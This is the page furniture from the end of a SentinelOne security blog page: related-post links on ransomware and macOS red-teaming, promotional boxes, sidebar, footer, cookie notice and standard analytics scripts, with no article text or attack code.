<li><a href="https://www.sentinelone.com/blog/iot-in-the-enterprise-how-dangerous-are-todays-smart-devices-to-network-security/" rel="noopener noreferrer" target="_blank">IoT in the Enterprise | How Dangerous Are Today&#8217;s &#8216;Smart&#8217; Devices to Network Security?</a></li>
<li><a href="https://www.sentinelone.com/blog/how-medusalocker-ransomware-aggressively-targets-remote-hosts/" rel="noopener noreferrer" target="_blank">How MedusaLocker Ransomware Aggressively Targets Remote Hosts</a></li>
<li><a href="https://www.sentinelone.com/blog/what-is-a-botnet-and-why-are-they-dangerous/" rel="noopener noreferrer" target="_blank">What is a Botnet? (And Why Are They Dangerous?)</a></li>
<li><a href="https://www.sentinelone.com/blog/macos-red-team-spoofing-privileged-helpers-and-others-to-gain-root/" rel="noopener noreferrer" target="_blank">macOS Red Team: Spoofing Privileged Helpers (and Others) to Gain Root</a></li>
<li><a href="https://www.sentinelone.com/blog/going-deep-a-guide-to-reversing-smoke-loader-malware/" rel="noopener noreferrer" target="_blank">Going Deep | A Guide to Reversing Smoke Loader Malware</a></li>
<li><a href="https://www.sentinelone.com/blog/build-your-own-ransomware-project-root-behind-enemy-lines-part-2/" target="_blank" rel="noopener noreferrer">Build Your Own Ransomware (Project Root) | Behind Enemy Lines Part 2</a></li>
</ul>
								</div>
							</article>
						</div>
						
<div class="featured-items">
	<h2>What's New</h2>
	<div class="featured-items-after-post">
			<div class="featured-item">
			<div class="fi-content">
							<img src="https://899029.smushcdn.com/2131410/wp-content/uploads/2021/03/Blog_CTA_01.jpg?lossy=0&strip=1&webp=0" />
						
			
									<p class="featured-type">
						Hack Chat					</p>
							
							<p class="featured-title">
					Hack Chat: Conversations with cybersecurity experts				</p>
										<div class="featured-content">
					<p>Tune in every week and learn how Cybersecurity community leaders are transforming the industry.</p>
				</div>
						
			</div>
							<div class="cta boxed purple">
					<a href="https://www.sentinelone.com/lp/hackchat/" target="_blank">
						<span>Watch Now</span>
					</a>
				</div>
					</div>
			<div class="featured-item">
			<div class="fi-content">
							<img src="https://899029.smushcdn.com/2131410/wp-content/uploads/2021/04/MITRE-Results-Blog-Image-395x263_update.png?lossy=0&strip=1&webp=0" />
						
			
									<p class="featured-type">
						Carbanak & Fin7 results					</p>
							
							<p class="featured-title">
					MITRE Engenuity ATT&CK Evaluation Results				</p>
										<div class="featured-content">
					<p>Record Performance. Watch our MITRE webinar to see SentinelOne’s victorious performance against Carbanak & Fin7.</p>
				</div>
						
			</div>
							<div class="cta boxed purple">
					<a href="https://www.sentinelone.com/lp/mitre/" target="_blank">
						<span>LEARN MORE</span>
					</a>
				</div>
					</div>
			<div class="featured-item">
			<div class="fi-content">
							<img src="https://899029.smushcdn.com/2131410/wp-content/uploads/2021/03/Blog_CTA_03.jpg?lossy=0&strip=1&webp=0" />
						
			
									<p class="featured-type">
						Get a demo					</p>
							
							<p class="featured-title">
					Defeat every attack, at every stage of the threat lifecycle with SentinelOne				</p>
										<div class="featured-content">
					<p>Book a demo and see the world’s most advanced cybersecurity platform in action. </p>
				</div>
						
			</div>
							<div class="cta boxed purple">
					<a href="https://www.sentinelone.com/request-demo/" target="_blank">
						<span>Get Demo</span>
					</a>
				</div>
					</div>
		</div>
</div>
					</div>
						<aside id="sidebar" class="widget-area">
		<section id="search-3" class="widget widget_search"><h2 class="widget-title">Search</h2><form role="search" method="get" class="search-form" action="https://www.sentinelone.com/">
	<label>
		<span class="screen-reader-text">Search ...</span>
		<input type="search" class="search-field" placeholder="Search ..." value="" name="s">
	</label>
	<input type="submit" class="search-submit" value="Search">
</form></section><section id="amazon_polly_player-2" class="widget widget_amazon_polly_player"><h2 class="widget-title">Listen to this Post</h2>


			<table id="amazon-polly-audio-table"><tbody><tr><td id="amazon-polly-audio-tab">
			<div id="amazon-ai-player-label"></div>
			<div id="amazon-ai-player-container">
			<audio class="amazon-ai-player" id="amazon-ai-player" preload="none" controls="" controlslist="nodownload">
			<source type="audio/mpeg" src="https://s3.us-east-1.amazonaws.com/audio-for-wordpress-45086892059684b045a4189d91d52199e7d604f2/2019/12/amazon_polly_26227.mp3?version=1576472500">
			</audio>
			</div>
			<div id="amazon-polly-subscribe-tab"></div>
			<div id="amazon-polly-by-tab"></div>
			</td></tr></tbody></table>

</section><section id="s1_signup-2" class="widget widget_s1_signup"><h2 class="widget-title">Sign Up</h2>
<div class="marketo-blog-subscribe">
	<div class="context">
		<p>Keep up to date with our weekly digest of articles.</p>
	</div>
	<form id="mktoForm_1985"></form>
	<div class="context" style="display:none">
		<p>Thanks!  Keep an eye out for new content!</p>
	</div>
	<script>
		MktoForms2.loadForm("//go.sentinelone.com", "327-MNM-087", 1985, function(form){
			form.onSuccess(function(values, followUpUrl) {
				form.getFormElem().hide();
				form.getFormElem().prev().hide();
				form.getFormElem().next().show();
				return false;
			});
		});
	</script>
</div>

</section><section id="srpw_widget-2" class="widget widget_smart_recent_entries smart_recent_posts"><h2 class="widget-title">Recent Posts</h2><div class="srpw-block srpw-default-style "><style>.srpw-thumbnail{
width: 60px;
height: 60px;
}</style><ul class="srpw-ul"><li class="srpw-li srpw-clearfix"><div class="srpw-content"><a class="srpw-title" href="https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-21-2/" target="_self">The Good, the Bad and the Ugly in Cybersecurity &#8211; Week 21</a><div class="srpw-meta"><time class="srpw-time published" datetime="2021-05-21T08:00:45-07:00">May 21, 2021</time></div></div></li><li class="srpw-li srpw-clearfix"><div class="srpw-content"><a class="srpw-title" href="https://www.sentinelone.com/blog/how-to-achieve-full-endpoint-security-with-your-current-team-and-resources/" target="_self">How To Achieve Full Endpoint Security With Your Current Team And Resources </a><div class="srpw-meta"><time class="srpw-time published" datetime="2021-05-17T09:47:02-07:00">May 17, 2021</time></div></div></li><li class="srpw-li srpw-clearfix"><div class="srpw-content"><a class="srpw-title" href="https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-20-2/" target="_self">The Good, the Bad and the Ugly in Cybersecurity &#8211; Week 20</a><div class="srpw-meta"><time class="srpw-time published" datetime="2021-05-14T08:00:53-07:00">May 14, 2021</time></div></div></li></ul></div><!-- Generated by http://wordpress.org/plugins/smart-recent-posts-widget/ --></section><section id="categories-3" class="widget widget_categories"><h2 class="widget-title">Blog Categories</h2>
			<ul>
					<li class="cat-item cat-item-1"><a href="https://www.sentinelone.com/blog/category/company/">Company</a>
</li>
	<li class="cat-item cat-item-4988"><a href="https://www.sentinelone.com/blog/category/spotlight/">Feature Spotlight</a>
</li>
	<li class="cat-item cat-item-4493"><a href="https://www.sentinelone.com/blog/category/life-at-s1/">Life @ S1</a>
</li>
	<li class="cat-item cat-item-138"><a href="https://www.sentinelone.com/blog/category/producttechnology/">Product/Technology</a>
</li>
	<li class="cat-item cat-item-115"><a href="https://www.sentinelone.com/blog/category/security/">Security</a>
</li>
	<li class="cat-item cat-item-114"><a href="https://www.sentinelone.com/blog/category/security-research/">Security Research</a>
</li>
	<li class="cat-item cat-item-116"><a href="https://www.sentinelone.com/blog/category/sentinelone-intelligence-reports/">SentinelOne Intelligence Reports</a>
</li>
	<li class="cat-item cat-item-9033"><a href="https://www.sentinelone.com/blog/category/the-good-the-bad-and-the-ugly/">The Good, the Bad and the Ugly</a>
</li>
			</ul>

			</section>	</aside>
				</div>
			</div>
		</div>
	</section>
</div>


	

	</div>
	

	<footer class="footer">
		<div class="container-wide">
			<div class="links">
				<div class="site-nav-holder"><div class="column"><strong class="opener-footer">Company</strong><ul class="slide"><li><a href="https://www.sentinelone.com/customer-page/">Our Customers</a></li><li><a href="/why-sentinelone/">Why SentinelOne</a></li><li><a href="/platform/">Platform</a></li><li><a href="/company/">About</a></li><li><a href="/partners/partner-overview/">Partners</a></li><li><a href="/support/">Support</a></li><li><a href="/careers/">Careers</a></li><li><a href="https://www.sentinelone.com/legal/">Legal &#038; Compliance</a></li><li><a href="https://www.sentinelone.com/security-compliance/">Security & Compliance</a></li><li><a href="/contact/">Contact Us</a></li></ul></div><div class="column"><strong class="opener-footer">Resources</strong><ul class="slide"><li><a href="/blog/">Blog</a></li><li><a href="https://labs.sentinelone.com">Labs</a></li><li><a href="https://www.sentinelone.com/lp/hackchat/">Hack Chat</a></li><li><a href="/press/">Press</a></li><li><a href="/news/">News</a></li><li><a href="https://www.sentinelone.com/faq/">FAQ</a></li><li><a href="/resources/">Resources</a></li></ul></div></div>			</div>
			<div class="about">
				<strong>Global Headquarters</strong>
<div class="blurb">
	<p>
		444 Castro Street
		<br />
		Suite 400
		<br />
		Mountain View, CA 94041
	</p>
	<p class="phone">+1-855-868-3733</p>
	<p><a href="mailto:sales@sentinelone.com">sales@sentinelone.com</a></p>
</div>			</div>
			<div class="signup">
				<div class="form-holder">
					<strong class="heading">Sign Up For Our Newsletter</strong>
					<form id="mktoForm_2816"></form>
					<div style="display:none">
						Thank you! You will now receive our weekly newsletter with all recent blog posts.  See you soon!					</div>
					<script>
						MktoForms2.loadForm( "//go.sentinelone.com", "327-MNM-087", 2816, function( form ){
							form.onSuccess( function( values, followUpUrl ) {
								form.getFormElem().hide();
								form.getFormElem().next().show();
								return false;
							} );
						} );
					</script>
				</div>
				<div class="icons">
					<a href="https://twitter.com/SentinelOne" target="_blank">
						<img src="https://www.sentinelone.com/wp-content/themes/sentinelone/carbine/assets/svg/social-twitter.svg" />
					</a>
					<a href="https://www.facebook.com/SentinelOne/" target="_blank">
						<img src="https://www.sentinelone.com/wp-content/themes/sentinelone/carbine/assets/svg/social-facebook.svg" />
					</a>
					<a href="https://www.linkedin.com/company/sentinelone/" target="_blank">
						<img src="https://www.sentinelone.com/wp-content/themes/sentinelone/carbine/assets/svg/social-linkedin.svg" />
					</a>
					<a href="https://goo.gl/e5C9f4" target="_blank">
						<img src="https://www.sentinelone.com/wp-content/themes/sentinelone/carbine/assets/svg/social-youtube.svg" />
					</a>
				</div>
					<div class="lang-select">
		<span class="label">English</span>
		<ul>
	<li class="current"><span href="https://www.sentinelone.com//">English</span></li><li class=""><a href="https://jp.sentinelone.com//">日本語</a></li><li class=""><a href="https://de.sentinelone.com//">Deutsch</a></li><li class=""><a href="https://es.sentinelone.com//">Español</a></li><li class=""><a href="https://fr.sentinelone.com//">Français</a></li><li class=""><a href="https://it.sentinelone.com//">Italiano</a></li><li class=""><a href="https://nl.sentinelone.com//">Dutch</a></li><li class=""><a href="https://kr.sentinelone.com//">한국어</a></li>		</ul>
	</div>
				</div>
		</div>
	</footer>	
	
	<footer class="copyright">
		<div class="container-wide">
			<div class="links">
				<a href="/legal/privacy-policy/">Privacy Policy</a>
<a href="/legal/terms-of-service/">Terms of Service</a>			</div>
			<img src="https://www.sentinelone.com/wp-content/themes/sentinelone/carbine/assets/svg/footer-logo.svg" />
			<div class="copy">
				©2021 SentinelOne, All Rights Reserved.			</div>
		</div>
	</footer>
	

		
		<div id="cookie-message-panel">
		<div class="container">
			<div class="blurb">
				SentinelOne and its service providers use browser cookies or similar technologies as specified in the SentinelOne Privacy Policy.  You can consent to the use of such technologies and browse the SentinelOne website by clicking the Accept button.			</div>
			<a class="btn" href="javascript:void(0);" id="continue-cookies">Accept</a>
			<a class="btn secondary" href="https://www.sentinelone.com/global-services/get-support-now/" id="reject-cookies">Reject</a>
		</div>
	</div>
	<script>
		MktoForms2.onFormRender(function( form ) {
			var button_row = form.getFormElem().find( '.mktoButtonRow' );
			var label      = button_row.find( 'button' ).html();
			var legalese   = 'By clicking {{LABEL}}, I agree to the use of my personal data in accordance with SentinelOne <a href=\"/legal/privacy-policy/\">Privacy Policy</a>. SentinelOne will not sell, trade, lease, or rent your personal data to third parties.';
			if ( button_row.data( 'inited' ) ) {
				return;
			}
			button_row.data( 'inited', true );
			button_row.after( '<div class="marketo-legal">' + legalese.split( '{{LABEL}}' ).join( label )  + '</div>' );
		} );
	</script>
		
	<div id="global-video-player">
		<div class="underlay"></div>
		<div class="close"><img src="https://www.sentinelone.com/wp-content/themes/sentinelone/carbine/assets/svg/testimonial_icon_close.svg" /></div>
		<video controls>
			<source src="" type="video/mp4">
		</video> 
	</div>
	
	<!-- https://linkedin.com/ -- added 06/09/20 by hypergeneric -->
<script type="text/javascript">
_linkedin_partner_id = "2225260";
window._linkedin_data_partner_ids = window._linkedin_data_partner_ids || [];
window._linkedin_data_partner_ids.push(_linkedin_partner_id);
</script><script type="text/javascript">
(function(){var s = document.getElementsByTagName("script")[0];
var b = document.createElement("script");
b.type = "text/javascript";b.async = true;
b.src = "https://snap.licdn.com/li.lms-analytics/insight.min.js";
s.parentNode.insertBefore(b, s);})();
</script>
<noscript>
<img height="1" width="1" style="display:none;" alt="" src="https://px.ads.linkedin.com/collect/?pid=2225260&fmt=gif" />
</noscript>


<!-- https://optinmonster.com/ -- added 07/17/20 by hypergeneric -->
<!-- This site is converting visitors into subscribers and customers with OptinMonster - https://optinmonster.com-->
<script type="text/javascript" src="https://a.omappapi.com/app/js/api.min.js" data-account="87916" data-user="78190" async></script>
<!-- / OptinMonster -->	<script>
	jQuery( document ).ready( function() {
		jQuery( 'pre' ).each( function ( i, block ) {
			hljs.highlightBlock( block );
		} );
	} );
	</script>
<script type='text/javascript' src='https://www.sentinelone.com/wp-includes/js/clipboard.min.js?ver=e99a8f3f6c9445ffcaf2f405e4d583b9' id='clipboard-js'></script>
<script type='text/javascript' src='https://www.sentinelone.com/wp-content/themes/sentinelone/carbine/assets/js/footer.min.js?ver=1621730643' id='carbine-script-footer-js'></script>
<script type='text/javascript' src='https://cdn.onesignal.com/sdks/OneSignalSDK.js?ver=e99a8f3f6c9445ffcaf2f405e4d583b9' async='async' id='remote_sdk-js'></script>
	
					
		
<script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","licenseKey":"NRJS-7f7a0b93139dcf56f90","applicationID":"773889139","transactionName":"ZlwDMkMCWxJQUkdYXF8WIAVFCloPHkJaX1RdXA==","queueTime":0,"applicationTime":571,"atts":"ShsARAsYSBw=","errorBeacon":"bam.nr-data.net","agent":""}</script></body>
</html>
